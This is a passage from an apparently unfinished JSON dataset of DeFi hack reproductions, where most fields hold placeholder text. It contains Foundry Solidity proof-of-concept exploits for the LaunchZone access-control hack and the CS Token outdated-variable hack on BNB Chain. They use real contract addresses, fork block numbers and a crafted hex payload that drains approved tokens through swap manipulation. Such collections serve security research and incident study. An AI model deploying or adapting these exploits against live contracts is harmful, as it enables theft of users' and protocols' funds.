uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "382b8ef4f5",
        "is_ready": false,
        "content": "### 20230227 - LaunchZone - Access Control\n### Lost: ~$320,000\n#### Contract\n[LuanchZone_exp.sol](src/test/LaunchZone_exp.sol)\n#### Link Reference\nhttps://twitter.com/immunefi/status/1630210901360951296\nhttps://twitter.com/launchzoneann/status/1631538253424918528",
        "date": "20230227",
        "target": "LaunchZone",
        "attack_title": "Access Control",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/immunefi/status/1630210901360951296",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/launchzoneann/status/1631538253424918528",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/LaunchZone_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\nimport \"forge-std/Test.sol\";\n// analysis\n// https://blog.verichains.io/p/analyzing-the-lz-token-hack\n// https://twitter.com/immunefi/status/1630210901360951296\n// reponse\n// https://twitter.com/launchzoneann/status/1631538253424918528\n// contracts to study\n// https://bscscan.com/address/0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01 implementation (unverified)\n// https://bscscan.com/address/0x1c2b102f22c08694eee5b1f45e7973b6eaca3e92  attacker contract\ninterface UniRouterLike {\n    function swap(uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data) external;\n    function swapExactTokensForTokens(uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline) external returns (uint256[] memory amounts);\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\n        external\n        view\n        returns (uint256[] memory amounts);\n}\ninterface ERC20Like {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from,\n        address to,\n        uint256 amount) external returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n}\ncontract LaunchZoneExploit is Test {\n    ERC20Like LZ;\n    ERC20Like BUSD;\n    ERC20Like BISWAPPair;\n    UniRouterLike BISWAPRouter;\n    UniRouterLike pancackeRouter;\n    address immutable BscexDeployer =\n        0xdad254728A37D1E80C21AFae688C64d0383cc307;\n    address immutable attacker = 0x1C2B102f22c08694EEe5B1f45E7973b6EACA3e92;\n    address immutable swapXImp = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01; // unverified\n    function setUp() public {\n        // select and fork bsc at 26024420\n        vm.createSelectFork(\"bsc\", 26_024_420 - 1); // previous block so still there is fund\n        LZ = ERC20Like(0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2);\n        BUSD = ERC20Like(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n        BISWAPPair = ERC20Like(0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593);\n        BISWAPRouter = UniRouterLike(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);\n        pancackeRouter = UniRouterLike(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n        vm.label(BscexDeployer, \"BscexDeployer\");\n        vm.label(address(LZ), \"LZ\");\n        vm.label(address(BUSD), \"BUSD\");\n        vm.label(address(BISWAPPair), \"BISWAP\");\n        vm.label(address(BISWAPRouter), \"BISWAP Router\");\n        vm.label(attacker, \"attacker\");\n        vm.label(address(this), \"thisContract\");\n    }\n    function testExploit() public {\n        console.log(\"Running on BSC at : \", block.number);\n        console.log(\"BscexDeployer LZ Balalnce\", LZ.balanceOf(BscexDeployer));\n        console.log(\"LZ allowance to swapXImp\",\n            LZ.allowance(BscexDeployer, swapXImp) / 1e18);\n        //  lazy payload check the previous swapX PoC\n        //  calling unverified contract of swapXImp with payload containing swap\n        //  (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data);\n        bytes\n            memory payload = hex\"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\";\n        (bool success,) = address(swapXImp).call(payload);\n        console.log(\"Payload delivered\", success);\n        console.log(\"BscexDeployer BUSD Balalnce\",\n            BUSD.balanceOf(BscexDeployer) / 1e18);\n        // give attacker 50 BUSD\n        deal(address(BUSD), address(this), 50 * 1e18);\n        // get BUSD from attacker\n        console.log(\"attacker BUSD Balalnce\",\n            BUSD.balanceOf(address(this)) / 1e18);\n        // approve router for 50 BUSD\n        BUSD.approve(address(BISWAPRouter), 50 * 1e18);\n        //get amount out for BUSD to LZ\n        // define path\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(LZ);\n        uint256[] memory amounts = BISWAPRouter.getAmountsOut(50 * 1e18, path);\n        console.log(\"amounts BUSD/LZ\", amounts[0] / 1e18, amounts[1] / 1e18);\n        // do the swap\n        BISWAPRouter.swapExactTokensForTokens(amounts[0],\n            amounts[1],\n            path,\n            address(this),\n            block.timestamp);\n        // at this point attack has 9_886_999 for 50 BUSD\n        console.log(\"attacker LZ Balalnce\", LZ.balanceOf(address(this)) / 1e18);\n        console.log(\"attacker BUSD Balalnce\",\n            BUSD.balanceOf(address(this)) / 1e18);\n        // reverse swap on pancake\n        // building a  new path\n        address[] memory path2 = new address[](2);\n        path2[0] = address(LZ);\n        path2[1] = address(BUSD);\n        // get amount out for LZ to BUSD from pancackeRouter\n        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(LZ.balanceOf(address(this)),\n            path2);\n        console.log(\"amounts LZ/BUSD\", amounts2[0] / 1e18, amounts2[1] / 1e18);\n        // attacker gets 88,899 BUSD for 9,886,999 LZ which bought for 50 BUSD\n        // approve pancackeRouter for 9,886,999 LZ\n        LZ.approve(address(pancackeRouter), LZ.balanceOf(address(this)));\n        // do the swap\n        pancackeRouter.swapExactTokensForTokens(amounts2[0],\n            amounts2[1],\n            path2,\n            address(this),\n            block.timestamp);\n        // check current BSUSD balance\n        console.log(\"attacker BUSD Balalnce\",\n            BUSD.balanceOf(address(this)) / 1e18);\n    }\n}",
                "token_count": 2193,
                "interfaces": [
                    {
                        "name": "UniRouterLike",
                        "content": "interface UniRouterLike {\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\n        external\n        view\n        returns (uint256[] memory amounts);\n}\n",
                        "token_count": 118,
                        "imported": false
                    },
                    {
                        "name": "ERC20Like",
                        "content": "interface ERC20Like {\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n}\n",
                        "token_count": 96,
                        "imported": false
                    }
                ]
            }
        ]
    },
    {
        "id": "08af7c443b",
        "is_ready": false,
        "content": "### 20230524 CS Token - Outdated Global Variable\n### Lost: ~714K USD\n#### Contract\n[CS_exp.sol](src/test/CS_exp.sol)\n#### Link Reference\nhttps://twitter.com/BlockSecTeam/status/1661098394130198528\nhttps://twitter.com/numencyber/status/1661207123102167041",
        "date": "20230524",
        "target": "CS Token",
        "attack_title": "Outdated Global Variable",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BlockSecTeam/status/1661098394130198528",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/numencyber/status/1661207123102167041",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/CS_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1661098394130198528\n// https://twitter.com/numencyber/status/1661207123102167041\n// @TX\n// @Summary\n// Outdated global variable `sellAmount` for calculating `burnAmount`\ncontract CSExp is Test, IPancakeCallee {\n    IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 CS = IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28466976);\n    }\n    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n        pair.swap(80_000_000 ether,\n            0,\n            address(this),\n            bytes(\"123\"));\n        emit log_named_decimal_uint(\"[End] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n    }\n    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{\n        require(msg.sender == address(pair));\n        BUSD.approve(address(router), BUSD.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(CS);\n        for (uint i = 0; i < 99; ++i) {\n            router.swapTokensForExactTokens(5000 ether,\n                BUSD.balanceOf(address(this)),\n                path,\n                address(this),\n                block.timestamp + 1000);\n        }\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(BUSD.balanceOf(address(this)),\n            1,\n            path,\n            0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5,\n            block.timestamp + 1000);\n        CS.approve(address(router), CS.balanceOf(address(this)));\n        path[0] = address(CS);\n        path[1] = address(BUSD);\n        while (CS.balanceOf(address(this)) >= 3000 ether) {\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(3000 ether,\n                1,\n                path,\n                address(this),\n                block.timestamp + 1000);\n            CS.transfer(address(this), 2);\n        }\n        BUSD.transfer(msg.sender, 80_240_000 ether);\n    }\n    receive() external payable {}\n}",
                "token_count": 717,
                "interfaces": [
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "IPancakePair",
                        "content": "interface IPancakePair {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external pure returns (string memory);\n\n  function symbol() external pure returns (string memory);\n\n  function decimals() external pure returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n  function nonces(address owner) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n\n  function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n  function factory() external view returns (address);\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 reserve0,\n    uint112 reserve1,\n    uint32 blockTimestampLast\n  );\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n  ) external;\n\n  function skim(address to) external;\n\n  function sync() external;\n\n  function initialize(address, address) external;\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "IPancakeRouter",
                        "content": "interface IPancakeRouter {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  receive() external payable;\n}\n",
                        "token_count": 1170,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "07702f21fb",
        "is_ready": false,
        "content": "### 20230119 - ThoreumFinance-business logic flaw\n### Lost: ~2000 BNB\n#### Contract\n[ThoreumFinance_exp.sol](src/test/ThoreumFinance_exp.sol)\n#### Link reference\nhttps://bscscan.com/tx/0x3fe3a1883f0ae263a260f7d3e9b462468f4f83c2c88bb89d1dee5d7d24262b51\nhttps://twitter.com/AnciliaInc/status/1615944396134043648",
        "date": "20230119",
        "target": "ThoreumFinance-business logic flaw",
        "attack_title": null,
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
